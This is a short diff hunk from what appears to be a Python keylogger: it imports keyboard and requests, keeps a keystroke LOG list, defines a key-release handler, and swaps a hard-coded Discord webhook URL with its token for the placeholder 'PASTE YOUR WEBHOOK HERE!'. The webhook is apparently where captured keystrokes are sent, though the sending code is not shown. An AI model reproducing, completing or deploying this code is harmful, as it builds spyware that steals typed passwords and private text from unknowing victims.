@@ -1,7 +1,7 @@
 import keyboard
 import requests
 
-WEBHOOK = "https://discord.com/api/webhooks/973952265838800916/mtFZaJI1zIdSZbg9Jhonn1CdxU6oHbBTlL9yU-JPu4PucNbv3idFZhWhf_SpWj1t6EK1"
+WEBHOOK = "PASTE YOUR WEBHOOK HERE!"
 LOG = []
 
 def on_key_release(key):
